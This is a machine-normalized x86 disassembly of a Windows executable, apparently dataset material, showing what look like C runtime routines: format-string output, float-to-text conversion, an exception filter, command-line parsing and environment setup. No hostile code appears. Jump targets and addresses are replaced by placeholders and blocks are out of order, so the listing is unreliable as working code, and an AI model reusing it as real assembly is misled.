cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40c509
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40c509
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40c5b4
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40c5a7
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40c5a7
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_40c5a7
pop ecx
xor edx edx
call sub_40c5a7
pop ecx
jmp r-xdata
call sub_40c5a7
pop ecx
movzx eax ax
jmp r-xdata
call sub_40c5a7
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_40db20
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_40c5a7
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_40c5c4
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_40db9b
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40c5a7
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_40dc10
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_408ea0
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_40c56f
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40c53e
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_40c56f
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_40c53e
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40c53e
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_40c56f
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_40db9b
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_40c509
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_40af2e
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_40c53e
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_40c509
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_40c56f
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_40c509
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40c5e4
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_40c622
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_40c5e4
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_40c64b
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_40ddeb
cmp eax 0x65
pop ecx
je r-xdata
mov cl [ rw-data ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_40bc27
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_40c6a5
mov eax [ esp + 0x4 ]
mov dl [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
cmp cl dl
je r-xdata
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx eax
cmp cl 0x65
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl 0x45
je r-xdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne r-xdata
dec eax
inc eax
jmp r-xdata
sub_40c70b
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40e275
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_40e248
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_40c749
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
je r-xdata
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_40e417
mov ebx [ ebp + 0x10 ]
mov esi eax
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebx + 0x1 ]
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
xor ecx ecx
test ebx ebx
setg cl
add edx eax
add ecx edx
push ecx
call sub_40e3a0
add esp 0x14
mov ebx [ ebp + 0x10 ]
mov eax [ rw-data ]
xor ecx ecx
mov esi eax
test ebx ebx
setg cl
push ecx
xor ecx ecx
cmp [ eax ] 0x2d
sete cl
add ecx [ ebp + 0xc ]
push ecx
call sub_40ca61
pop ecx
pop ecx
jmp r-xdata
test ebx ebx
jle r-xdata
mov [ eax ] 0x2d
inc eax
cmp [ esi ] 0x2d
mov eax [ ebp + 0xc ]
jne r-xdata
xor ecx ecx
push r--data
cmp [ rw-data ] cl
sete cl
add ecx eax
add ecx ebx
push ecx
call sub_40e2b0
cmp [ ebp + 0x14 ] 0x0
pop ecx
pop ecx
mov ecx eax
je r-xdata
mov cl [ eax + 0x1 ]
push edi
lea edi [ eax + 0x1 ]
mov [ eax ] cl
mov cl [ rw-data ]
mov eax edi
pop edi
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax [ ebp + 0xc ]
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns r-xdata
inc ecx
cmp ebx 0x64
jl r-xdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl r-xdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_40c84d
cmp [ rw-data ] 0x0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
je r-xdata
mov eax [ esp + 0x14 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_40e417
mov ebx [ esp + 0x24 ]
mov esi eax
push esi
mov eax [ esi + 0x4 ]
add eax ebx
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax ebp
push eax
call sub_40e3a0
add esp 0x14
mov eax [ rw-data ]
mov ebx [ esp + 0x1c ]
mov esi [ rw-data ]
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebp ] 0x2d
lea edi [ ebp + 0x1 ]
cmp [ esi ] 0x2d
mov edi ebp
jne r-xdata
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebp
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
jmp r-xdata
add edi eax
push 0x1
push edi
call sub_40ca61
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push 0x1
push edi
call sub_40ca61
mov al [ rw-data ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge r-xdata
test ebx ebx
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
neg esi
cmp ebx esi
jl r-xdata
neg esi
jmp r-xdata
push ebx
push edi
call sub_40ca61
push ebx
push 0x30
push edi
call sub_40e540
add esp 0x14
mov ebx esi
sub_40c92b
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push ecx
push ecx
fld [ edi ]
fstp [ esp ]
call sub_40e417
mov [ rw-data ] eax
mov ecx [ eax + 0x4 ]
dec ecx
mov ebx [ ebp + 0x10 ]
mov [ rw-data ] ecx
xor ecx ecx
cmp [ eax ] 0x2d
push eax
push ebx
sete cl
add ecx [ ebp + 0xc ]
mov esi ecx
push esi
call sub_40e3a0
mov eax [ rw-data ]
add esp 0x14
mov ecx [ eax + 0x4 ]
dec ecx
cmp [ rw-data ] ecx
setl cl
mov [ rw-data ] cl
mov eax [ eax + 0x4 ]
dec eax
cmp eax 0xfffffffc
mov [ rw-data ] eax
jl r-xdata
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
push edi
call sub_40c9c6
add esp 0x10
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
push ebx
push [ ebp + 0xc ]
push edi
call sub_40c9ed
add esp 0xc
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
and [ esi - 0x2 ] al
sub_40ca10
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c749
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c92b
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c84d
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_40ca61
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_40db20
inc eax
push eax
push esi
add esi edi
push esi
call sub_408fa0
add esp 0x10
pop esi
sub_40ca86
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_40cbc7
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
push esi
cmp ecx edx
jge r-xdata
mov eax [ eax ]
mov esi [ rw-data ]
cmp eax 0xc000008e
jne r-xdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rw-data ]
cmp eax 0xc0000090
jne r-xdata
mov [ rw-data ] 0x83
jmp r-xdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ rw-data ] 0x81
jmp r-xdata
push [ rw-data ]
push 0x8
call ebx
pop ecx
mov [ rw-data ] esi
pop ecx
pop esi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ rw-data ] 0x84
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ rw-data ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ rw-data ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ rw-data ] 0x86
jmp r-xdata
mov [ rw-data ] 0x8a
sub_40cbc7
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40cc0a
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_40e9a7
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_40e5a1
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_40cc62
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_40e9a7
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_4083df
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_409624
pop ecx
push esi
call sub_40db20
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_4083b0
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_4083df
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_40db20
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_40e2b0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_409624
pop ecx
sub_40cd1b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_40e9a7
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40cdb4
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_4083df
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40cdb4
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_409624
pop ecx
sub_40cdb4
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_40cf68
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
